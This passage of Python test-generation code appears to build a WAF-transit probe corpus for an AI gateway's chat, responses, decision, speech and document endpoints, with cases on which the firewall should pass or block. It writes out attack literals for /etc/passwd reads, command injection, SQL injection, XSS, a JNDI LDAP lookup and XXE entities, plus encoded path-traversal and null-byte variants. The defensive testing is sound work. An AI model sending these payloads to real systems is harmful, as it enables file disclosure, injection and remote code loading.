              "properties": {"child": {"$ref": "#/$defs/outer/$defs/inner"}}, "additionalProperties": False}},
              "properties": {"nested": {"$ref": "#/$defs/outer"}}, "additionalProperties": False}
    variants.append(("deep-defs", "$defs.outer.$defs.inner.properties.value.default", schema))
    return variants


def _schema_field(prefix: str, field_name: str) -> str:
    return "keys:" + prefix + "." + field_name[5:] if field_name.startswith("keys:") else prefix + "." + field_name


def extended_content(routes: list[Route]) -> list[Probe]:
    """Add generated schemas, tool state and media without changing old cases.

    ``payload_field`` uses ``keys:<parent field path>`` when the tested bytes
    occur in a property name rather than a value. Multipart ``input.text`` is a
    JSON string inside the multipart ``input`` part, not a separate text part.
    These anonymous probes verify WAF transit, never inference functionality.
    """
    cases = []
    for route in routes:
        if route.method != "POST":
            continue
        is_chat = route.target == "gateway" and route.path == "/models/openai/v1/chat/completions"
        is_responses = route.target == "gateway" and route.path == "/models/openai/v1/responses"
        is_decision = (route.target, route.path) in {
            ("gateway", "/models/microsoft-decision/v1/systemone"),
            ("portal", "/api/models/decision"),
        }
        for label, text in payloads():
            if is_chat or is_responses:
                base = _json_variants(route, "Synthetic generated-content probe")[0][1]
                for schema_label, relative_field, schema in _schema_variants(text):
                    if is_chat:
                        value = {**base, "response_format": {"type": "json_schema", "json_schema": {"name": "synthetic_probe", "strict": False, "schema": schema}}}
                        prefix = "response_format.json_schema.schema"
                        variant = "chat-response-schema-" + schema_label
                    else:
                        value = {**base, "tools": [{"type": "function", "name": "synthetic_probe", "strict": False, "parameters": schema}]}
                        prefix = "tools[].parameters"
                        variant = "responses-tool-schema-" + schema_label
                    cases.append(_probe(route, "extended-" + variant + "-" + label, "extended-content-" + variant,
                        body=json_bytes(value), headers=[("Content-Type", "application/json")], payload_field=_schema_field(prefix, relative_field)))
                    if is_responses and schema_label in {"dynamic-key", "deep-defs"}:
                        value = {**base, "text": {"format": {"type": "json_schema", "name": "synthetic_probe", "strict": False, "schema": schema}}}
                        variant = "responses-output-schema-" + schema_label
                        cases.append(_probe(route, "extended-" + variant + "-" + label, "extended-content-" + variant,
                            body=json_bytes(value), headers=[("Content-Type", "application/json")], payload_field=_schema_field("text.format.schema", relative_field)))
                if is_responses:
                    value = {**base, "input": [{"type": "function_call", "call_id": "call_waf_probe", "name": "synthetic_probe", "arguments": json_bytes({"value": text}).decode()},
                        {"type": "function_call_output", "call_id": "call_waf_probe", "output": "Synthetic output"}]}
                    cases.append(_probe(route, "extended-responses-arguments-" + label, "extended-content-responses-function-arguments",
                        body=json_bytes(value), headers=[("Content-Type", "application/json")], payload_field="input[].arguments"))
                    value = {**base, "input": [{"type": "reasoning", "id": "rs_waf_probe", "summary": [], "encrypted_content": text},
                        {"role": "user", "content": "Synthetic continuation"}]}
                    cases.append(_probe(route, "extended-responses-encrypted-" + label, "extended-content-responses-encrypted-content",
                        body=json_bytes(value), headers=[("Content-Type", "application/json")], payload_field="input[].encrypted_content"))
            if is_decision:
                base = _json_variants(route, "Synthetic decision state")[0][1]
                for variant, payload_field, state in (
                    ("dynamic-key", "keys:state", {text: "Synthetic value"}),
                    ("scalar-string", "state", text),
                    ("array", "state[]", [text, 1, True, None]),
                ):
                    cases.append(_probe(route, "extended-decision-state-" + variant + "-" + label, "extended-content-decision-state-" + variant,
                        body=json_bytes({**base, "state": state}), headers=[("Content-Type", "application/json")], payload_field=payload_field))
            if route.target == "portal" and route.path == "/api/models/speech":
                portal_input = _json_variants(route, text)[0][1]
                cases.append(_probe(route, "extended-speech-multipart-input-" + label, "extended-content-speech-multipart-input",
                    body=_multipart("Synthetic audio fixture", portal_input=portal_input), headers=[("Content-Type", "multipart/form-data; boundary=waf-probe-fixed-boundary")], payload_field="input.text"))
        if is_decision:
            base = _json_variants(route, "Synthetic scalar state")[0][1]
            for label, value in (("zero", 0), ("negative", -1), ("float", 1.5), ("true", True), ("false", False), ("null", None)):
                cases.append(_probe(route, "extended-decision-state-scalar-" + label, "extended-content-decision-state-scalar-json",
                    body=json_bytes({**base, "state": value}), headers=[("Content-Type", "application/json")], payload_field="state"))
        if route.target == "gateway" and route.path == "/models/blackforestlabs/v1/flux-2/edits":
            # The edit operation takes raw Base64, unlike generation's
            # prompt-only contract. Exercise that field so media false positives
            # cannot hide behind a successful text-prompt probe.
            for label, text in payloads()[:8]:
                image = base64.b64encode(_binary_fixture("image/png", text)).decode()
                value = {"model": (route.constraint.get("allowedModels") or ["waf-probe-invalid-model"])[0],
                    "prompt": "Make the background blue.", "input_image": image, "width": 256, "height": 256}
                cases.append(_probe(route, "extended-bfl-edit-image-base64-" + label, "extended-content-bfl-edit-image-base64",
                    body=json_bytes(value), headers=[("Content-Type", "application/json")], payload_field="input_image"))
        if is_chat or is_responses:
            for label, text in payloads()[:8]:
                base = _json_variants(route, "Inspect synthetic media")[0][1]
                if is_chat:
                    image = "data:image/png;base64," + base64.b64encode(_binary_fixture("image/png", text)).decode()
                    value = {**base, "messages": [{"role": "user", "content": [{"type": "text", "text": "Synthetic image"}, {"type": "image_url", "image_url": {"url": image}}]}]}
                    cases.append(_probe(route, "extended-chat-image-data-url-" + label, "extended-content-chat-image-data-url",
                        body=json_bytes(value), headers=[("Content-Type", "application/json")], payload_field="messages[].content[].image_url.url"))
                    audio = base64.b64encode(_binary_fixture("audio/wav", text)).decode()
                    value = {**base, "messages": [{"role": "user", "content": [{"type": "input_audio", "input_audio": {"data": audio, "format": "wav"}}]}]}
                    cases.append(_probe(route, "extended-chat-audio-base64-" + label, "extended-content-chat-input-audio-base64",
                        body=json_bytes(value), headers=[("Content-Type", "application/json")], payload_field="messages[].content[].input_audio.data"))
                else:
                    document = "data:application/pdf;base64," + base64.b64encode(_binary_fixture("application/pdf", text)).decode()
                    value = {**base, "input": [{"role": "user", "content": [{"type": "input_text", "text": "Synthetic document"}, {"type": "input_file", "filename": "probe.pdf", "file_data": document}]}]}
                    cases.append(_probe(route, "extended-responses-file-data-url-" + label, "extended-content-responses-file-data-url",
                        body=json_bytes(value), headers=[("Content-Type", "application/json")], payload_field="input[].content[].file_data"))
    return cases


def adversarial_content(routes: list[Route]) -> list[Probe]:
    """Place strong signatures into inert source text in approved data fields.

    The XML external-entity example remains a JSON/multipart string. No XML
    document is submitted to an XML parser, no credential is attached, and no
    request asks a model to execute the source text.
    """
    signatures = (
        ("literal-lfi", "../../etc/passwd"),
        ("literal-rce", ";cat /etc/passwd"),
        ("literal-sqli", "1' OR '1'='1' UNION SELECT NULL--"),
        ("literal-xss", "<img src=x onerror=alert(1)>"),
        ("literal-jndi", "${jndi:ldap://waf-probe.invalid/synthetic}"),
        ("literal-xxe", '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'),
    )
    cases = []
    for route in routes:
        if route.method != "POST":
            continue
        free_json = route.body_format == "json" and _json_variants(route, "probe")[0][0] != "validation_canary"
        multipart_prompt = route.target == "gateway" and route.body_format == "multipart" and route.constraint.get("kind") == "pathModel"
        if not free_json and not multipart_prompt:
            continue
        for label, signature in signatures:
            text = "Analyze the following inert source text: " + signature
            body, mime = _body(route, text)
            payload_field = _json_variants(route, text)[0][0] if free_json else "prompt"
            cases.append(_probe(route, "adversarial-documentation-" + label, "extended-content-literal-attack-documentation",
                body=body, headers=[("Content-Type", mime)], payload_field=payload_field))
    return cases


def decision_question_keys(routes: list[Route]) -> list[Probe]:
    """Vary permitted dynamic question/criteria names while values stay simple."""
    cases = []
    for route in routes:
        if route.method != "POST" or (route.target, route.path) not in {
            ("gateway", "/models/microsoft-decision/v1/systemone"),
            ("portal", "/api/models/decision"),
        }:
            continue
        base = _json_variants(route, "Synthetic decision context")[0][1]
        for label, text in payloads():
            variants = (
                ("question-name", "keys:questions", {text: {"type": "noul", "instructions": "Is this a code sample?"}}),
                ("criteria-name", "keys:questions.q.criteria", {"q": {"type": "choice", "instructions": "Choose a label.",
                    "criteria": {text: "Synthetic choice", "alternative": "Other choice"}}}),
            )
            for variant, payload_field, questions in variants:
                cases.append(_probe(route, "extended-decision-" + variant + "-" + label, "extended-content-decision-question-keys",
                    body=json_bytes({**base, "questions": questions}), headers=[("Content-Type", "application/json")], payload_field=payload_field))
    return cases


def _raw_guard_pdf(text: str) -> bytes:
    """Create a small one-page PDF with a complete object/xref structure."""
    literal = text.encode("ascii").replace(b"\\", b"\\\\").replace(b"(", b"\\(").replace(b")", b"\\)")
    stream = b"BT /F1 10 Tf 72 720 Td (" + literal + b") Tj ET\n"
    objects = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>",
        b"<< /Length " + str(len(stream)).encode() + b" >>\nstream\n" + stream + b"endstream",
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    ]
    result = bytearray(b"%PDF-1.4\n% synthetic raw-body boundary fixture\n")
    offsets = [0]
    for number, obj in enumerate(objects, 1):
        offsets.append(len(result))
        result.extend(str(number).encode() + b" 0 obj\n" + obj + b"\nendobj\n")
    xref = len(result)
    result.extend(b"xref\n0 6\n0000000000 65535 f \n")
    for offset in offsets[1:]:
        result.extend(f"{offset:010d} 00000 n \n".encode())
    result.extend(b"trailer\n<< /Size 6 /Root 1 0 R >>\nstartxref\n" + str(xref).encode() + b"\n%%EOF\n")
    return bytes(result)


def _raw_guard_body(route: Route, text: str) -> tuple[bytes, str]:
    """Keep body fixtures valid while varying only their inert text metadata."""
    if route.path == "/models/azure-speech/v1/synthesize":
        value = ('<speak xmlns="http://www.w3.org/2001/10/synthesis" version="1.0" xml:lang="en-US">'
                 '<voice name="en-US-JennyNeural">' + escape(text) + '</voice></speak>')
        return value.encode(), "application/ssml+xml"
    if route.path == "/models/azure-speech/v1/recognize":
        return _binary_fixture("audio/wav", text), "audio/wav"
    if route.path == "/tools/documents/v1/analyze":
        return _raw_guard_pdf(text), "application/pdf"
    raise ValueError("raw body guard accepts only the three explicit raw body contracts")


def raw_body_guard_controls(routes: list[Route]) -> list[Probe]:
    """Build standalone raw-body/data-versus-control probes, outside build_corpus.

    Body-only traversal strings on the exact SSML/WAV/PDF contracts are inert
    data controls. The same strings in query/header/cookie or an adjacent path
    are attack controls, not additional allowed data fields. Percent text is
    passed through each channel's normal encoding; for query arguments the
    request_url encoder adds the wire encoding layer. Actual NUL is tested only
    as a query value, where it becomes %00, never as an invalid HTTP header.

    The SSML external-entity declaration is unused: no entity reference or
    network-resolving parser is invoked by this function. All probes are
    anonymous. The only external address in a fixture is reserved example.invalid.
    """
    paths = {"/models/azure-speech/v1/synthesize", "/models/azure-speech/v1/recognize", "/tools/documents/v1/analyze"}
    candidates = [route for route in routes if route.target == "gateway" and route.method == "POST" and route.path in paths]
    if {route.path for route in candidates} != paths or len(candidates) != 3:
        raise ValueError("raw body guard requires exactly the three published POST contracts")
    values = (
        ("parent-slash", "../raw-guard-fixture.txt"),
        ("parent-backslash", "..\\raw-guard-fixture.txt"),
        ("percent-lower", "%2e%2e%2fraw-guard-fixture.txt"),
        ("percent-upper", "%2E%2E%2Fraw-guard-fixture.txt"),
        ("percent-backslash", "%2e%2e%5craw-guard-fixture.txt"),
        ("double-percent", "%252e%252e%252fraw-guard-fixture.txt"),
        ("percent-null", "../raw-guard%00.txt"),
        ("mixed-case", "../RaW-GuArD-FiXtUrE.TxT"),
    )
    cases = []
    for route in sorted(candidates, key=lambda item: item.path):
        baseline, mime = _raw_guard_body(route, "Synthetic raw-body guard baseline")
        headers = [("Content-Type", mime)]
        cases.append(_probe(route, "raw-guard-baseline", "raw-guard-baseline", body=baseline, headers=headers, payload_field="raw-body:data"))
        for label, value in values:
            body, _ = _raw_guard_body(route, "Inert source text: " + value)
            cases.append(_probe(route, "raw-guard-body-data-" + label, "raw-guard-body-data", body=body, headers=headers, payload_field="raw-body:data"))
            cases.append(_probe(route, "raw-guard-query-" + label, "raw-guard-query", intent="attack_control",
                body=baseline, headers=headers, query=[("raw_guard", value)], payload_field="query:raw_guard"))
            cases.append(_probe(route, "raw-guard-header-" + label, "raw-guard-header", intent="attack_control",
                body=baseline, headers=headers + [("X-Header", value)], payload_field="header:X-Header"))
            cases.append(_probe(route, "raw-guard-cookie-" + label, "raw-guard-cookie", intent="attack_control",
                body=baseline, headers=headers + [("Cookie", "raw_guard=" + value)], payload_field="cookie:raw_guard"))
            neighbor = replace(route, path=route.path + "/neighbor")
            cases.append(_probe(neighbor, "raw-guard-neighbor-query-" + label, "raw-guard-neighbor-query", intent="attack_control",
                body=baseline, headers=headers, query=[("raw_guard", value)], payload_field="query:raw_guard"))
            if label in {"parent-slash", "parent-backslash"}:
                cases.append(_probe(neighbor, "raw-guard-neighbor-body-" + label, "raw-guard-neighbor-body", intent="attack_control",
                    body=body, headers=headers, payload_field="raw-body:unpublished-neighbor"))
        cases.append(_probe(route, "raw-guard-query-null", "raw-guard-query-null", intent="attack_control",
            body=baseline, headers=headers, query=[("raw_guard", "../raw-guard\x00.txt")], payload_field="query:raw_guard"))
        for label, path in (("upper", route.path.upper()), ("prefix-case", route.path.replace("/models/", "/Models/").replace("/tools/", "/Tools/"))):
            for traversal_label, value in values[:2]:
                changed_case = replace(route, path=path)
                cases.append(_probe(changed_case, "raw-guard-casepath-" + label + "-" + traversal_label, "raw-guard-casepath-query", intent="attack_control",
                    body=baseline, headers=headers, query=[("raw_guard", value)], payload_field="query:raw_guard"))
        if route.path == "/models/azure-speech/v1/synthesize":
            declaration = '<!DOCTYPE speak [<!ENTITY raw_guard SYSTEM "https://example.invalid/raw-guard-entity.txt">]>'
            body = b'<?xml version="1.0" encoding="UTF-8"?>\n' + declaration.encode() + b"\n" + baseline
            cases.append(_probe(route, "raw-guard-ssml-unused-external-entity", "raw-guard-ssml-external-entity", intent="attack_control",
                body=body, headers=headers, payload_field="raw-body:doctype-external-entity-declaration"))
    ids = [case.case_id for case in cases]
    if len(ids) != len(set(ids)):
        raise ValueError("duplicate raw guard case IDs")
    return cases


def jndi_field_probes(routes: list[Route]) -> list[Probe]:
    """Build standalone JNDI source-text data and logging attack controls.

    Data probes place the literal into one permitted free field per request.
    Unknown body fields/query arguments are attack controls; metadata/header
    logging controls use a separate nonexistent path. No credentials or raw
    SSML/WAV/PDF body are used. This corpus stays outside build_corpus.
    """
    literal = "${jndi:ldap://waf-probe.invalid/synthetic}"
    cases = []
    query_collisions = set()
    def add_query_collision(route, payload_field, baseline, mime):
        parts = payload_field.replace("[]", "").split(".")
        query_name = ".".join(("q" if index and parts[index - 1] == "questions" else "a") if part == "*" else part
                              for index, part in enumerate(parts))
        boundary = (route.target, route.path, query_name)
        if boundary in query_collisions:
            return
        query_collisions.add(boundary)
        suffix = hashlib.sha256(payload_field.encode()).hexdigest()[:8]
        cases.append(_probe(route, "jndi-data-query-collision-" + suffix, "data-query-name-collision-jndi", intent="validation",
            body=baseline, headers=[("Content-Type", mime)], query=[(query_name, literal)], payload_field=payload_field))
    for route in routes:
        if route.method != "POST":
            continue
        variants = _json_variants(route, literal) if route.body_format == "json" else []
        variants = [(field_name, value) for field_name, value in variants if field_name != "validation_canary"]
        gateway_multipart = route.target == "gateway" and route.body_format == "multipart" and route.constraint.get("kind") == "pathModel"
        if not variants and not gateway_multipart:
            continue
        baseline, mime = _body(route, "Synthetic JNDI field boundary baseline")
        headers = [("Content-Type", mime)]
        for payload_field, value in variants:
            suffix = hashlib.sha256(payload_field.encode()).hexdigest()[:8]
            cases.append(_probe(route, "jndi-data-" + suffix, "extended-content-jndi-all-fields",
                body=json_bytes(value), headers=[("Content-Type", "application/json")], payload_field=payload_field))
            add_query_collision(route, payload_field, baseline, mime)
        if gateway_multipart:
            body, mime = _body(route, literal)
            cases.append(_probe(route, "jndi-data-multipart-prompt", "extended-content-jndi-all-fields",
                body=body, headers=[("Content-Type", mime)], payload_field="prompt"))
            add_query_collision(route, "prompt", baseline, mime)
            part = ('--waf-probe-fixed-boundary\r\nContent-Disposition: form-data; name="_attack"\r\n\r\n' + literal + '\r\n').encode()
            unknown_body = part + baseline
        else:
            normal = _json_variants(route, "Synthetic JNDI field boundary baseline")[0][1]
            unknown_body = json_bytes({**normal, "_attack": literal})
        cases.append(_probe(route, "jndi-control-unknown-field", "jndi-field-control-unknown", intent="attack_control",
            body=unknown_body, headers=headers, payload_field="_attack"))
        cases.append(_probe(route, "jndi-control-query-id", "jndi-field-control-query", intent="attack_control",
            body=baseline, headers=headers, query=[("id", literal)], payload_field="query:id"))
        if route.target == "portal" and route.path == "/api/models/speech":
            portal_input = _json_variants(route, literal)[0][1]
            cases.append(_probe(route, "jndi-data-multipart-input-text", "extended-content-jndi-all-fields",
                body=_multipart("Synthetic audio fixture", portal_input=portal_input),
                headers=[("Content-Type", "multipart/form-data; boundary=waf-probe-fixed-boundary")], payload_field="input.text"))
            normal_input = _json_variants(route, "Synthetic JNDI field boundary baseline")[0][1]
            add_query_collision(route, "input.text", _multipart("Synthetic audio fixture", portal_input=normal_input), "multipart/form-data; boundary=waf-probe-fixed-boundary")
    # Reuse native coding-history envelopes with only one source signature.
    # The general corpus stays unchanged; these cases cover equivalent data
    # paths that a scalar chat message or tool result cannot exercise.
    route_by_path = {(route.target, route.method, route.path): route for route in routes}
    covered_fields = {(case.target, case.path, case.payload_field) for case in cases
                      if case.category == "extended-content-jndi-all-fields"}
    for case in _coding_content_probes(routes, (("jndi-source", literal),), literal):
        if case.intent != "compatibility" or case.payload_field.startswith("keys:"):
            continue
        route = route_by_path[(case.target, case.method, case.path)]
        label = case.category.removeprefix("ai-coding-")
        if ((case.target, case.path, case.payload_field) in covered_fields
                and label not in {"jndi-source-tool-parts", "jndi-source-reasoning-content",
                                  "jndi-source-native-local-output", "jndi-source-native-patch-output"}):
            continue
        body = case.body
        if label == "legacy-definition":
            value = json.loads(body)
            value["functions"][0]["parameters"] = {"type": "object", "properties": {}}
            body = json_bytes(value)
        cases.append(_probe(route, "jndi-ai-" + label, "extended-content-jndi-ai-history",
            body=body, headers=case.headers, payload_field=case.payload_field))
        baseline, mime = _body(route, "Synthetic JNDI field boundary baseline")
        add_query_collision(route, case.payload_field, baseline, mime)
        if label == "jndi-source-tool-parts" and route.path.endswith("/chat/completions"):
            value = json.loads(case.body)
            value["messages"][2]["content"] = literal
            cases.append(_probe(route, "jndi-ai-tool-string", "extended-content-jndi-ai-history",
                body=json_bytes(value), headers=case.headers, payload_field="messages[].content"))
        if label == "jndi-source-tool-parts" and route.path.endswith("/responses"):
            value = json.loads(case.body)
            value["input"][1]["arguments"] = json_bytes({"source": literal}).decode()
            value["input"][2]["output"] = "Synthetic result"
            payload_field = "input[].arguments"
            cases.append(_probe(route, "jndi-ai-function-arguments", "extended-content-jndi-ai-history",
                body=json_bytes(value), headers=case.headers, payload_field=payload_field))
            add_query_collision(route, payload_field, baseline, mime)
    for route in routes:
        if route.method != "POST":
            continue
        is_responses = route.target == "gateway" and route.path == "/models/openai/v1/responses"
        is_chat = route.target == "gateway" and route.path == "/models/openai/v1/chat/completions"
        is_decision = (route.target, route.path) in {
            ("gateway", "/models/microsoft-decision/v1/systemone"), ("portal", "/api/models/decision")}
        if not (is_responses or is_chat or is_decision):
            continue
        base = _json_variants(route, "Synthetic JNDI key boundary baseline", canary=True)[0][1]
        schema = {"type": "object", "properties": {literal: {"type": "string"}}}
        function = {"name": "synthetic_probe", "parameters": schema}
        if is_responses:
            variants = (
                ("output-schema", "keys:text.format.schema.properties", {**base, "text": {"format": {
                    "type": "json_schema", "name": "synthetic_probe", "schema": schema}}}),
                ("function-schema", "keys:tools[].parameters.properties", {**base, "tools": [{"type": "function", **function}]}),
                ("nested-schema", "keys:input[].tools[].tools[].parameters.properties", {**base, "input": [
                    {"type": "tool_search_call", "call_id": "call_waf_search", "arguments": {"query": "synthetic"}, "execution": "client"},
                    {"type": "tool_search_output", "call_id": "call_waf_search", "execution": "client", "tools": [
                        {"type": "namespace", "name": "synthetic_namespace", "tools": [{"type": "function", **function}]}]},
                    {"role": "user", "content": "Review the synthetic schema."}]}),
            )
            variants += tuple(
                item for item in _conversation_data_variants(base, True, literal)
                if item[1].startswith("keys:")
            )
            for label, field_name, value in (
                ("arguments-sibling", "input[].argumentsExtra", {**base, "input": [{
                    "type": "tool_search_call", "call_id": "call_waf_search",
                    "arguments": {"query": "Synthetic query"},
                    "argumentsExtra": literal, "execution": "client"}]}),
                ("schema-sibling", "input[].tools[].parametersExtra", {**base, "input": [{
                    "type": "tool_search_output", "call_id": "call_waf_search",
                    "execution": "client", "tools": [{"type": "function",
                        "name": "synthetic_probe", "parametersExtra": literal}]}]}),
            ):
                cases.append(_probe(
                    route, "jndi-control-" + label, "jndi-field-control-" + label,
                    intent="attack_control", body=json_bytes(value),
                    headers=[("Content-Type", "application/json")],
                    payload_field=field_name))
        elif is_chat:
            variants = (
                ("output-schema", "keys:response_format.json_schema.schema.properties", {**base, "response_format": {
                    "type": "json_schema", "json_schema": {"name": "synthetic_probe", "schema": schema}}}),
                ("function-schema", "keys:tools[].function.parameters.properties", {**base, "tools": [{"type": "function", "function": function}]}),
                ("legacy-schema", "keys:functions[].parameters.properties", {**base, "functions": [function]}),
            )
            variants += tuple(
                item for item in _conversation_data_variants(base, False, literal)
                if item[1].startswith("keys:")
            )
            cases.append(_probe(
                route, "jndi-control-reasoning-sibling", "jndi-field-control-reasoning-sibling",
                intent="attack_control", body=json_bytes({**base, "messages": [{
                    "role": "assistant", "content": "Synthetic final answer",
                    "reasoning_contentExtra": literal}]}),
                headers=[("Content-Type", "application/json")],
                payload_field="messages[].reasoning_contentExtra"))
        else:
            variants = (
                ("question-name", "keys:questions", {**base, "questions": {literal: {"type": "noul", "instructions": "Synthetic question."}}}),
                ("state-key", "keys:state", {**base, "state": {literal: "Synthetic value"}}),
            )
        if is_responses or is_chat:
            cases.append(_probe(
                route, "jndi-control-model", "jndi-field-control-model",
                intent="attack_control", body=json_bytes({**base, "model": literal}),
                headers=[("Content-Type", "application/json")], payload_field="model"))
        for label, payload_field, value in variants:
            cases.append(_probe(route, "jndi-key-" + label, "extended-content-jndi-dynamic-keys",
                body=json_bytes(value), headers=[("Content-Type", "application/json")], payload_field=payload_field))
            query_name = payload_field.removeprefix("keys:").replace("[]", "") + "." + literal
            baseline, mime = _body(route, "Synthetic JNDI key boundary baseline")
            cases.append(_probe(route, "jndi-key-query-collision-" + label, "data-query-key-collision-jndi", intent="validation",
                body=baseline, headers=[("Content-Type", mime)], query=[(query_name, "Synthetic value")], payload_field=payload_field))
    for target in ("gateway", "portal"):
        route = Route(target, "GET", "/waf-probe/jndi-nonexistent", "jndi-logging-control", "synthetic JNDI logging control", "none")
        cases.append(_probe(route, "jndi-logging-query-metadata", "jndi-logging-control-query", intent="attack_control",
            query=[("metadata", literal)], payload_field="query:metadata"))
        cases.append(_probe(route, "jndi-logging-header", "jndi-logging-control-header", intent="attack_control",
            headers=[("X-Attack", literal)], payload_field="header:X-Attack"))
    ids = [case.case_id for case in cases]
    if len(ids) != len(set(ids)):
        raise ValueError("duplicate JNDI field case IDs")
    return cases


def _conversation_data_variants(
    base: dict, is_responses: bool, text: str,
) -> list[tuple[str, str, dict]]:
    """履歴・説明・Schemaの各データ欄へ合成文字列を1種類ずつ入れます。

    正規APIの配列・refusal・reasoning・tool searchの形を使います。
    ``keys:``は値ではなく任意のJSONプロパティ名を試すケースです。
    専用toolの履歴も合成JSONだけで、tools指定や実行は行いません。
    """
    plain_schema = {"type": "object", "properties": {}}
    source_schema = {"type": "object", "properties": {
        "sample": {"type": "string", "description": text}}}
    key_schema = {"type": "object", "properties": {text: {"type": "string"}}}
    if not is_responses:
        continuation = {"role": "user", "content": "Continue the synthetic review."}
        return [
            ("assistant-refusal", "messages[].refusal", {**base, "messages": [
                {"role": "assistant", "content": None, "refusal": text}, continuation]}),
            ("assistant-refusal-parts", "messages[].content[].refusal", {**base, "messages": [
                {"role": "assistant", "content": [{"type": "refusal", "refusal": text}]}, continuation]}),
            ("assistant-reasoning", "messages[].reasoning_content", {**base, "messages": [
                {"role": "assistant", "content": "Synthetic final answer",
                 "reasoning_content": text}, continuation]}),
            ("prediction-string", "prediction.content", {**base,
                "prediction": {"type": "content", "content": text}}),
            ("prediction-parts", "prediction.content[].text", {**base,
                "prediction": {"type": "content", "content": [{"type": "text", "text": text}]}}),
            ("format-description", "response_format.json_schema.description", {**base,
                "response_format": {"type": "json_schema", "json_schema": {
                    "name": "synthetic_probe", "description": text,
                    "strict": False, "schema": plain_schema}}}),
            ("format-schema-key", "keys:response_format.json_schema.schema.properties", {**base,
                "response_format": {"type": "json_schema", "json_schema": {
                    "name": "synthetic_probe", "strict": False, "schema": key_schema}}}),
            ("function-parameters-key", "keys:tools[].function.parameters.properties", {**base,
                "tools": [{"type": "function", "function": {
                    "name": "synthetic_probe", "parameters": key_schema}}]}),
            ("legacy-parameters-key", "keys:functions[].parameters.properties", {**base,
                "functions": [{"name": "synthetic_probe", "parameters": key_schema}]}),
        ]

    function = {"type": "function", "name": "synthetic_probe",
                "parameters": plain_schema}
    namespace = {"type": "namespace", "name": "synthetic_namespace",
                 "description": "Synthetic namespace", "tools": [function]}

    def tool_history(tool: dict) -> dict:
        return {**base, "input": [
            {"type": "tool_search_call", "call_id": "call_waf_search",
             "arguments": {"query": "Synthetic query"}, "execution": "client"},
            {"type": "tool_search_output", "call_id": "call_waf_search",
             "execution": "client", "tools": [tool]},
            {"role": "user", "content": "Review the synthetic tool definition."},
        ]}

    variants = [
        ("reasoning-summary", "input[].summary[].text", {**base, "input": [
            {"type": "reasoning", "id": "rs_waf_summary", "summary": [
                {"type": "summary_text", "text": text}]},
            {"role": "user", "content": "Continue the synthetic review."}]}),
        ("reasoning-content", "input[].content[].text", {**base, "input": [
            {"type": "reasoning", "id": "rs_waf_content", "summary": [],
             "content": [{"type": "reasoning_text", "text": text}]},
            {"role": "user", "content": "Continue the synthetic review."}]}),
        ("assistant-refusal", "input[].content[].refusal", {**base, "input": [
            {"type": "message", "id": "msg_waf_refusal", "role": "assistant",
             "status": "completed", "content": [{"type": "refusal", "refusal": text}]},
            {"role": "user", "content": "Continue the synthetic review."}]}),
        ("format-description", "text.format.description", {**base,
            "text": {"format": {"type": "json_schema", "name": "synthetic_probe",
                "description": text, "strict": False, "schema": plain_schema}}}),
        ("function-output-schema", "tools[].output_schema.properties.sample.description",
            {**base, "tools": [{**function, "output_schema": source_schema}]}),
        ("function-output-schema-key", "keys:tools[].output_schema.properties",
            {**base, "tools": [{**function, "output_schema": key_schema}]}),
        ("format-schema-key", "keys:text.format.schema.properties", {**base,
            "text": {"format": {"type": "json_schema", "name": "synthetic_probe",
                "strict": False, "schema": key_schema}}}),
        ("function-parameters-key", "keys:tools[].parameters.properties",
            {**base, "tools": [{**function, "parameters": key_schema}]}),
        ("nested-function-parameters-key", "keys:input[].tools[].tools[].parameters.properties",
            tool_history({**namespace, "tools": [{**function, "parameters": key_schema}]})),
        ("direct-function-description", "input[].tools[].description",
            tool_history({**function, "description": text})),
        ("direct-custom-description", "input[].tools[].description",
            tool_history({"type": "custom", "name": "synthetic_custom",
                          "description": text, "format": {"type": "text"}})),
        ("namespace-description", "input[].tools[].description",
            tool_history({**namespace, "description": text})),
        ("direct-custom-grammar", "input[].tools[].format.definition",
            tool_history({"type": "custom", "name": "synthetic_custom",
                "format": {"type": "grammar", "syntax": "regex", "definition": text}})),
        ("direct-function-schema", "input[].tools[].parameters.properties.sample.description",
            tool_history({**function, "parameters": source_schema})),
        ("direct-function-schema-key", "keys:input[].tools[].parameters.properties",
            tool_history({**function, "parameters": key_schema})),
        ("direct-output-schema", "input[].tools[].output_schema.properties.sample.description",
            tool_history({**function, "output_schema": source_schema})),
        ("direct-output-schema-key", "keys:input[].tools[].output_schema.properties",
            tool_history({**function, "output_schema": key_schema})),
        ("nested-output-schema", "input[].tools[].tools[].output_schema.properties.sample.description",
            tool_history({**namespace, "tools": [{**function, "output_schema": source_schema}]})),
        ("nested-output-schema-key", "keys:input[].tools[].tools[].output_schema.properties",
            tool_history({**namespace, "tools": [{**function, "output_schema": key_schema}]})),
    ]
    for label, arguments in (("object-arguments", {"query": text}),
                             ("object-arguments-key", {text: "Synthetic value"})):
        value = tool_history(function)
        value["input"][0]["arguments"] = arguments
        field = "keys:input[].arguments" if label.endswith("-key") else "input[].arguments.query"
        variants.append((label, field, value))
    variants.extend(_native_history_variants(base, text))
    return variants


def _native_history_variants(base: dict, text: str) -> list[tuple[str, str, dict]]:
    """native shell・patchの合成履歴を作り、コマンドは実行しません。

    トップレベルtoolsの契約を変更せず、通常の本文と同じ不正モデル・
    匿名canaryで専用Itemのコマンド、diff、結果の各文字列を試します。
    """
    local = {"type": "local_shell_call", "id": "ls_waf_native",
             "call_id": "call_waf_local", "status": "completed",
             "action": {"type": "exec", "command": ["printf", "synthetic"], "env": {}}}
    local_output = {"type": "local_shell_call_output", "id": "call_waf_local",
                    "status": "completed", "output": "Synthetic local output"}
    shell = {"type": "shell_call", "call_id": "call_waf_shell", "status": "completed",
             "action": {"commands": ["printf synthetic"]}}
    shell_output = {"type": "shell_call_output", "call_id": "call_waf_shell",
                    "status": "completed", "output": [{"stdout": "Synthetic stdout",
                        "stderr": "", "outcome": {"type": "exit", "exit_code": 0}}]}
    patch = {"type": "apply_patch_call", "call_id": "call_waf_patch", "status": "completed",
             "operation": {"type": "create_file", "path": "synthetic-probe.txt",
                           "diff": "+Synthetic file\n"}}
    patch_output = {"type": "apply_patch_call_output", "call_id": "call_waf_patch",
                    "status": "completed", "output": "Synthetic patch output"}

    def history(call: dict, output: dict) -> dict:
        return {**base, "input": [call, output,
